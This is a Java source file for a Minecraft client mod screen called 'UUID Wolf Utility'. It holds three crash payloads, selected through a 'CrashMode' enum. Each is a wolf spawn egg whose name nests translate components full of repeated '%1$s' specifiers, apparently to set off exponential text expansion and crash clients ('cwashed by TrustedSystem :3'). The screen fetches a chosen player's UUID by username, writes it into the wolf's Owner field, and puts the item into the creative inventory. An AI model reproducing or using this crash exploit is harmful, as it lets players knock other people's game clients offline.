package com.trusted.systemnbteditor.gui;

import com.trusted.systemnbteditor.util.UuidUtils;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.EditBoxWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

public class UuidWolfUtilityScreen extends Screen {
    private final Screen parent;
    private TextFieldWidget usernameField;
    private EditBoxWidget nbtEditor;
    private ButtonWidget convertButton;
    private ButtonWidget givePuppyButton;
    private ButtonWidget modeToggleButton;
    private net.minecraft.client.gui.screen.ChatInputSuggestor suggestor;

    private enum CrashMode {
        DEFAULT("Default"),
        BYPASS("Bypass"),
        LARGEDATA("LargeData");

        final String name;
        CrashMode(String name) { this.name = name; }
    }

    private CrashMode currentMode = CrashMode.DEFAULT;

    private static final String DEFAULT_NBT = "{\n" +
            "    components: {\n" +
            "        \"minecraft:entity_data\": {\n" +
            "            CustomName: {\n" +
            "                translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                  with: [\n" +
            "                    {\n" +
            "                        translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                          with: [\n" +
            "                            {\n" +
            "                                translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                  with: [\n" +
            "                                    {\n" +
            "                                        translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                          with: [\n" +
            "                                            {\n" +
            "                                                translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                                  with: [\n" +
            "                                                    {\n" +
            "                                                        translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                                          with: [\n" +
            "                                                            {\n" +
            "                                                                translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                                                  with: [\n" +
            "                                                                    {\n" +
            "                                                                        translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                                                          with: [\n" +
            "                                                                            {\n" +
            "                                                                                translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                                                                  with: [\n" +
            "                                                                                    {\n" +
            "                                                                                        translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                                                                          with: [\n" +
            "                                                                                            {\n" +
            "                                                                                                translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                                                                                  with: [\n" +
            "                                                                                                    {\n" +
            "                                                                                                        translate: \"%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",\n" +
            "                                                                                                          with: [\n" +
            "                                                                                                            \"cwashed by TrustedSystem :3\"\n" +
            "                                                                                                        ]\n" +
            "                                                                                                    }\n" +
            "                                                                                                ]\n" +
            "                                                                                            }\n" +
            "                                                                                        ]\n" +
            "                                                                                    }\n" +
            "                                                                                ]\n" +
            "                                                                            }\n" +
            "                                                                        ]\n" +
            "                                                                    }\n" +
            "                                                                ]\n" +
            "                                                            }\n" +
            "                                                        ]\n" +
            "                                                    }\n" +
            "                                                ]\n" +
            "                                            }\n" +
            "                                        ]\n" +
            "                                    }\n" +
            "                                ]\n" +
            "                            }\n" +
            "                        ]\n" +
            "                    }\n" +
            "                ]\n" +
            "            },\n" +
            "              CustomNameVisible: 0b,\n" +
            "              DeathTime: -999999999,\n" +
            "              Health: 1.0f,\n" +
            "              Owner: [\n" +
            "                I;0,\n" +
            "                  0,\n" +
            "                  0,\n" +
            "                  0\n" +
            "            ],\n" +
            "              Silent: 1b,\n" +
            "              active_effects: [\n" +
            "                {\n" +
            "                    amplifier: 124,\n" +
            "                      duration: -1,\n" +
            "                      id: \"minecraft:instant_damage\",\n" +
            "                      show_particles: 0b\n" +
            "                }\n" +
            "            ],\n" +
            "              attributes: [\n" +
            "                {\n" +
            "                    base: 0.0d,\n" +
            "                      id: \"minecraft:scale\"\n" +
            "                }\n" +
            "            ],\n" +
            "              id: \"minecraft:wolf\"\n" +
            "        },\n" +
            "          \"minecraft:item_name\": {\n" +
            "            extra: [\n" +
            "                {\n" +
            "                    color: \"#521FD7\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"U\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#492DDA\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"U\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#403BDD\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"I\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#364AE0\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"D\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#2D58E4\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \" \"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#2367E7\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"W\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#1A75EA\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"o\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#1084EE\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"l\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#1E72E9\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"f\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#2C5FE3\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \" \"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#3A4CDD\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"U\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#4839D8\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"t\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#5626D2\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"i\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#6413CC\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"l\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#6413CC\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"i\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#6413CC\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"t\"\n" +
            "                },\n" +
            "                  {\n" +
            "                    color: \"#6413CC\",\n" +
            "                      italic: 0b,\n" +
            "                      text: \"y\"\n" +
            "                }\n" +
            "            ],\n" +
            "              text: \"\"\n" +
            "        },\n" +
            "          \"minecraft:lore\": [\n" +
            "            \"\",\n" +
            "              \"\",\n" +
            "              {\n" +
            "                extra: [\n" +
            "                    {\n" +
            "                        color: \"dark_gray\",\n" +
            "                          italic: 0b,\n" +
            "                          text: \"Credit: 1e310 and Metoki_\"\n" +
            "                    }\n" +
            "                ],\n" +
            "                  text: \"\"\n" +
            "            }\n" +
            "        ]\n" +
            "    },\n" +
            "      count: 64,\n" +
            "      id: \"minecraft:wolf_spawn_egg\"\n" +
            "}";

    private static final String BYPASS_NBT = "{\n" +
            "    components: {\n" +
            "        \"minecraft:entity_data\": {\n" +
            "            CustomName: {\n" +
            "                translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s12\",\n" +
            "                with: [\n" +
            "                    {\n" +
            "                        translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s11\",\n" +
            "                        with: [\n" +
            "                            {\n" +
            "                                translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s10\",\n" +
            "                                with: [\n" +
            "                                    {\n" +
            "                                        translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s9\",\n" +
            "                                        with: [\n" +
            "                                            {\n" +
            "                                                translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s8\",\n" +
            "                                                with: [\n" +
            "                                                    {\n" +
            "                                                        translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s7\",\n" +
            "                                                        with: [\n" +
            "                                                            {\n" +
            "                                                                translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s6\",\n" +
            "                                                                with: [\n" +
            "                                                                    {\n" +
            "                                                                        translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s5\",\n" +
            "                                                                        with: [\n" +
            "                                                                            {\n" +
            "                                                                                translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s4\",\n" +
            "                                                                                with: [\n" +
            "                                                                                    {\n" +
            "                                                                                        translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s3\",\n" +
            "                                                                                        with: [\n" +
            "                                                                                            {\n" +
            "                                                                                                translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s2\",\n" +
            "                                                                                                with: [\n" +
            "                                                                                                    {\n" +
            "                                                                                                        translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s1\",\n" +
            "                                                                                                        with: [\n" +
            "                                                                                                            \"cwashed </3\"\n" +
            "                                                                                                        ]\n" +
            "                                                                                                    }\n" +
            "                                                                                                ]\n" +
            "                                                                                            }\n" +
            "                                                                                        ]\n" +
            "                                                                                    }\n" +
            "                                                                                ]\n" +
            "                                                                            }\n" +
            "                                                                        ]\n" +
            "                                                                    }\n" +
            "                                                                ]\n" +
            "                                                            }\n" +
            "                                                        ]\n" +
            "                                                    }\n" +
            "                                                ]\n" +
            "                                            }\n" +
            "                                        ]\n" +
            "                                    }\n" +
            "                                ]\n" +
            "                            }\n" +
            "                        ]\n" +
            "                    }\n" +
            "                ]\n" +
            "            },\n" +
            "            CustomNameVisible: 0b,\n" +
            "            DeathTime: -999999999,\n" +
            "            Health: 1.0f,\n" +
            "            Owner: [\n" +
            "                I;-1906100201,\n" +
            "                537676048,\n" +
            "                -1176343848,\n" +
            "                1782709678\n" +
            "            ],\n" +
            "            Silent: 1b,\n" +
            "            active_effects: [\n" +
            "                {\n" +
            "                    amplifier: 124,\n" +
            "                    duration: -1,\n" +
            "                    id: \"minecraft:instant_damage\",\n" +
            "                    show_particles: 0b\n" +
            "                }\n" +
            "            ],\n" +
            "            attributes: [\n" +
            "                {\n" +
            "                    base: 0.0d,\n" +
            "                    id: \"minecraft:scale\"\n" +
            "                }\n" +
            "            ],\n" +
            "            id: \"minecraft:wolf\"\n" +
            "        }\n" +
            "    },\n" +
            "    count: 1,\n" +
            "    id: \"minecraft:wolf_spawn_egg\"\n" +
            "}";

    private static final String LARGEDATA_NBT = buildLargeDataNbt();

    private static String buildLargeDataNbt() {
        StringBuilder sb = new StringBuilder();
        sb.append("{\n" +
                "    components: {\n" +
                "        \"minecraft:entity_data\": {\n" +
                "            CustomName: {\n" +
                "                translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s40\",\n" +
                "                with: [\n");
        
        for (int i = 39; i >= 1; i--) {
            String indent = "    ".repeat(40 - i + 4);
            sb.append(indent).append("{\n");
            sb.append(indent).append("    translate: \"%s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s").append(i).append("\",\n");
            sb.append(indent).append("    with: [\n");
        }
        
        String deepIndent = "    ".repeat(44);
        sb.append(deepIndent).append("\"cwashed </3\"\n");
        
        for (int i = 1; i <= 39; i++) {
            String indent = "    ".repeat(40 - i + 4);
            sb.append(indent).append("    ]\n");
            sb.append(indent).append("}\n");
        }
        
        sb.append("                ]\n" +
                "            },\n" +
                "            CustomNameVisible: 0b,\n" +
                "            DeathTime: -999999999,\n" +
                "            Health: 1.0f,\n" +
                "            Owner: [\n" +
                "                I;-1906100201,\n" +
                "                537676048,\n" +
                "                -1176343848,\n" +
                "                1782709678\n" +
                "            ],\n" +
                "            Silent: 1b,\n" +
                "            active_effects: [\n" +
                "                {\n" +
                "                    amplifier: 124,\n" +
                "                    duration: -1,\n" +
                "                    id: \"minecraft:instant_damage\",\n" +
                "                    show_particles: 0b\n" +
                "                }\n" +
                "            ],\n" +
                "            attributes: [\n" +
                "                {\n" +
                "                    base: 0.0d,\n" +
                "                    id: \"minecraft:scale\"\n" +
                "                }\n" +
                "            ],\n" +
                "            id: \"minecraft:wolf\"\n" +
                "        }\n" +
                "    },\n" +
                "    count: 1,\n" +
                "    id: \"minecraft:wolf_spawn_egg\"\n" +
                "}");
        
        return sb.toString();
    }

    public UuidWolfUtilityScreen(Screen parent) {
        super(Text.of("UUID Wolf Utility"));
        this.parent = parent;
    }

    @Override
    protected void init() {
        super.init();
        
        // Revised Layout:
        // Username(120) + 5 + Fetch(100) + 5 + Mode(100) + 5 + Give(100) = 435
        int totalTopWidth = 120 + 5 + 100 + 5 + 100 + 5 + 100;
        int startX = (this.width - totalTopWidth) / 2;
        int topY = 30;
        
        int nbtX = 20;
        int nbtY = 60;
        int nbtWidth = this.width - 40;
        int nbtHeight = this.height - nbtY - 20;

        this.nbtEditor = new EditBoxWidget.Builder()
                .x(nbtX).y(nbtY)
                .build(this.textRenderer, nbtWidth, nbtHeight, Text.of("NBT"));
        this.nbtEditor.setMaxLength(Integer.MAX_VALUE);
        this.nbtEditor.setText(getCurrentModeNbt());
        this.addSelectableChild(this.nbtEditor);

        this.usernameField = new TextFieldWidget(this.textRenderer, startX, topY, 120, 20, Text.of("Username"));
        this.usernameField.setPlaceholder(Text.literal("Username").formatted(Formatting.GRAY));
        this.addDrawableChild(this.usernameField);

        this.convertButton = ButtonWidget.builder(Text.literal("Fetch").formatted(Formatting.BLUE), button -> performConversion())
                .dimensions(startX + 125, topY, 100, 20).build();
        this.addDrawableChild(this.convertButton);

        this.modeToggleButton = ButtonWidget.builder(Text.literal("Mode: " + currentMode.name).formatted(Formatting.WHITE), button -> {
            currentMode = CrashMode.values()[(currentMode.ordinal() + 1) % CrashMode.values().length];
            button.setMessage(Text.literal("Mode: " + currentMode.name).formatted(Formatting.WHITE));
            this.nbtEditor.setText(getCurrentModeNbt());
        }).dimensions(startX + 230, topY, 100, 20).build();
        this.addDrawableChild(this.modeToggleButton);

        this.givePuppyButton = ButtonWidget.builder(Text.literal("Give Puppy").formatted(Formatting.GOLD), button -> givePuppy())
                .dimensions(startX + 335, topY, 100, 20).build();
        this.addDrawableChild(this.givePuppyButton);

        this.addDrawableChild(ButtonWidget.builder(Text.of("Back"), button -> {
            if (this.client != null) this.client.setScreen(this.parent);
        }).dimensions(this.width / 2 - 50, this.height - 30, 100, 20).build());
        
        setupSuggestor(nbtX, nbtY, nbtWidth, nbtHeight);
    }

    private String getCurrentModeNbt() {
        switch (currentMode) {
            case BYPASS: return BYPASS_NBT;
            case LARGEDATA: return LARGEDATA_NBT;
            default: return DEFAULT_NBT;
        }
    }

    private void setupSuggestor(int x, int y, int width, int height) {
        TextFieldWidget adapter = new TextFieldWidget(this.textRenderer, x, y, width, height, Text.of("dummy")) {
            private java.lang.reflect.Field cursorField;
            private java.lang.reflect.Field selectionEndField;
            private java.lang.reflect.Field scrollYField;
            {
                try {
                    Class<?> clazz = net.minecraft.client.gui.widget.EditBoxWidget.class;
                    try { cursorField = clazz.getDeclaredField("cursor"); } catch (NoSuchFieldException e) {}
                    if (cursorField != null) cursorField.setAccessible(true);
                    try { selectionEndField = clazz.getDeclaredField("selectionEnd"); } catch (NoSuchFieldException e) {}
                    if (selectionEndField != null) selectionEndField.setAccessible(true);
                    try { scrollYField = clazz.getDeclaredField("scrollY"); } catch (NoSuchFieldException e) {
                        try { scrollYField = clazz.getDeclaredField("scrollOffset"); } catch (Exception ex) {}
                    }
                    if (scrollYField != null) scrollYField.setAccessible(true);
                } catch (Exception e) {}
            }
            private void setReflect(java.lang.reflect.Field field, int val) { try { if (field != null) field.setInt(nbtEditor, val); } catch (Exception e) {} }
            private int getReflect(java.lang.reflect.Field field) { try { return field != null ? field.getInt(nbtEditor) : 0; } catch (Exception e) { return 0; } }
            private int getRealCursor() { return getReflect(cursorField); }
            private int getLineStart() {
                String text = nbtEditor.getText(); int c = getRealCursor();
                if (c > text.length()) c = text.length();
                int start = text.lastIndexOf('\n', c - 1); return start + 1;
            }
            private int getLineEnd() {
                String text = nbtEditor.getText(); int c = getRealCursor();
                int end = text.indexOf('\n', c); return end == -1 ? text.length() : end;
            }
            @Override public String getText() {
                String full = nbtEditor.getText(); int start = getLineStart(); int end = getLineEnd();
                if (start < 0) start = 0; if (end > full.length()) end = full.length();
                return start > end ? "" : full.substring(start, end);
            }
            @Override public void setText(String text) {
                String full = nbtEditor.getText(); int start = getLineStart(); int end = getLineEnd();
                nbtEditor.setText(full.substring(0, start) + text + full.substring(end));
                int newCursor = start + text.length(); setReflect(cursorField, newCursor); setReflect(selectionEndField, newCursor);
            }
            @Override public void write(String text) {
                String full = nbtEditor.getText(); int c = getRealCursor();
                nbtEditor.setText(full.substring(0, c) + text + full.substring(c));
                int next = c + text.length(); setReflect(cursorField, next); setReflect(selectionEndField, next);
                if (suggestor != null) suggestor.refresh();
            }
            @Override public void eraseCharacters(int characterOffset) {
                String content = nbtEditor.getText(); int pos = getRealCursor();
                int start = Math.max(0, pos + (characterOffset < 0 ? characterOffset : 0));
                int end = Math.min(content.length(), pos + (characterOffset > 0 ? characterOffset : 0));
                if (start < end) {
                    nbtEditor.setText(content.substring(0, start) + content.substring(end));
                    setReflect(cursorField, start); setReflect(selectionEndField, start);
                }
            }
            @Override public int getCursor() { return Math.max(0, getRealCursor() - getLineStart()); }
            @Override public void setCursor(int cursor, boolean shift) {
                int start = getLineStart(); int real = Math.min(getLineEnd(), start + cursor);
                setReflect(cursorField, real); if (!shift) setReflect(selectionEndField, real);
            }
            @Override public int getX() { return nbtEditor.getX(); }
            @Override public int getY() {
                try {
                    double scroll = scrollYField != null ? scrollYField.getDouble(nbtEditor) : 0;
                    int c = getReflect(cursorField); String text = nbtEditor.getText(); int row = 0;
                    for(int i=0; i<c && i<text.length(); i++) if(text.charAt(i)=='\n') row++;
                    return nbtEditor.getY() + (row * 9) - (int)scroll;
                } catch(Exception e) { return nbtEditor.getY(); }
            }
            @Override public int getHeight() { return 9; }
            @Override public int getWidth() { return nbtEditor.getWidth(); }
        };

        this.suggestor = new net.minecraft.client.gui.screen.ChatInputSuggestor(this.client, this, adapter, this.textRenderer, true, true, 0, 7, false, 0x80000000) {
            @Override public void refresh() {
                String text = nbtEditor.getText(); int cursor = 0;
                try {
                    java.lang.reflect.Field f = net.minecraft.client.gui.widget.EditBoxWidget.class.getDeclaredField("cursor");
                    f.setAccessible(true); cursor = f.getInt(nbtEditor);
                } catch (Exception e) {}
                final int finalCursor = cursor;
                java.util.concurrent.CompletableFuture<com.mojang.brigadier.suggestion.Suggestions> future = 
                    com.trusted.systemnbteditor.integration.NBTAutocompleteIntegration.getSuggestions("minecraft:wolf_spawn_egg", text, new com.mojang.brigadier.suggestion.SuggestionsBuilder(text, finalCursor));
                try {
                    java.lang.reflect.Field pendingField = net.minecraft.client.gui.screen.ChatInputSuggestor.class.getDeclaredField("pendingSuggestions");
                    pendingField.setAccessible(true); pendingField.set(this, future);
                } catch (Exception e) {}
                future.thenRun(() -> {
                    if (future.isDone()) {
                        try {
                            java.lang.reflect.Method m = net.minecraft.client.gui.screen.ChatInputSuggestor.class.getDeclaredMethod("showCommandSuggestions");
                            m.setAccessible(true); m.invoke(this);
                        } catch (Exception e) {
                            try {
                                java.lang.reflect.Method m = net.minecraft.client.gui.screen.ChatInputSuggestor.class.getDeclaredMethod("showSuggestions");
                                m.setAccessible(true); m.invoke(this);
                            } catch (Exception ex) {}
                        }
                    }
                });
            }
        };
        this.suggestor.setWindowActive(true);
        this.suggestor.refresh();
    }

    private void givePuppy() {
        if (this.client == null || this.client.player == null) return;
        try {
            String nbtText = this.nbtEditor.getText();
            net.minecraft.nbt.NbtCompound nbt = net.minecraft.command.argument.NbtCompoundArgumentType.nbtCompound().parse(new com.mojang.brigadier.StringReader(nbtText));
            net.minecraft.registry.RegistryWrapper.WrapperLookup lookup = this.client.world.getRegistryManager();
            net.minecraft.registry.RegistryOps<net.minecraft.nbt.NbtElement> ops = net.minecraft.registry.RegistryOps.of(net.minecraft.nbt.NbtOps.INSTANCE, lookup);
            net.minecraft.item.ItemStack stack = net.minecraft.item.ItemStack.CODEC.parse(ops, nbt).result().orElse(net.minecraft.item.ItemStack.EMPTY);
            if (!stack.isEmpty()) {
                this.client.player.getInventory().setStack(this.client.player.getInventory().selectedSlot, stack);
                this.client.interactionManager.clickCreativeStack(stack, 36 + this.client.player.getInventory().selectedSlot);
                this.client.player.sendMessage(Text.literal("Puppy given!").formatted(Formatting.GREEN), true);
            } else {
                this.client.player.sendMessage(Text.literal("Invalid NBT for item.").formatted(Formatting.RED), false);
            }
        } catch (Exception e) {
            this.client.player.sendMessage(Text.literal("Error: " + e.getMessage()).formatted(Formatting.RED), false);
        }
    }

    private void performConversion() {
        String name = this.usernameField.getText().trim();
        if (name.isEmpty()) return;
        this.convertButton.active = false;
        new Thread(() -> {
            String currentNbt = this.nbtEditor.getText();
            java.util.UUID uuid = UuidUtils.fetchUuid(name);
            if (uuid != null) {
                String intArray = UuidUtils.formatIntArrayUuid(uuid);
                String ownerPattern = "(?s)Owner:\\s*\\[\\s*I;[-0-9,\\s]+\\]";
                String replacement = "Owner: [" + intArray + "]";
                String updatedNbt = currentNbt.replaceFirst(ownerPattern, replacement);
                if (this.client != null) {
                    this.client.execute(() -> {
                        this.nbtEditor.setText(updatedNbt);
                        this.convertButton.active = true;
                        if (this.client.player != null) this.client.player.sendMessage(Text.literal("Fetch complete.").formatted(Formatting.GRAY), true);
                    });
                }
            } else {
                if (this.client != null) this.client.execute(() -> this.convertButton.active = true);
            }
        }).start();
    }

    @Override
    public void renderBackground(DrawContext context, int mouseX, int mouseY, float delta) {
        context.fill(0, 0, this.width, this.height, 0x80000000);
    }

    @Override
    public void render(DrawContext context, int mouseX, int mouseY, float delta) {
        super.render(context, mouseX, mouseY, delta);
        
        boolean showBackground = com.trusted.systemnbteditor.data.ModConfig.getInstance().showEditorBackground;
        com.trusted.systemnbteditor.util.MixinState.isRenderingNbtEditor = true;
        if (!showBackground) {
            com.trusted.systemnbteditor.util.MixinState.isRenderingEditorContents = true;
        }
        
        this.nbtEditor.render(context, mouseX, mouseY, delta);
        
        com.trusted.systemnbteditor.util.MixinState.isRenderingEditorContents = false;
        com.trusted.systemnbteditor.util.MixinState.isRenderingNbtEditor = false;

        // Manual border if transparent
        if (!showBackground) {
             int borderColor = -6250336;
             int bx = this.nbtEditor.getX();
             int by = this.nbtEditor.getY();
             int bw = this.nbtEditor.getWidth();
             int bh = this.nbtEditor.getHeight();
             context.fill(bx, by, bx + bw, by + 1, borderColor); // Top
             context.fill(bx, by + bh - 1, bx + bw, by + bh, borderColor); // Bottom
             context.fill(bx, by, bx + 1, by + bh, borderColor); // Left
             context.fill(bx + bw - 1, by, bx + bw, by + bh, borderColor); // Right
        }

        if (this.suggestor != null) {
            this.suggestor.render(context, mouseX, mouseY);
        }
    }
}
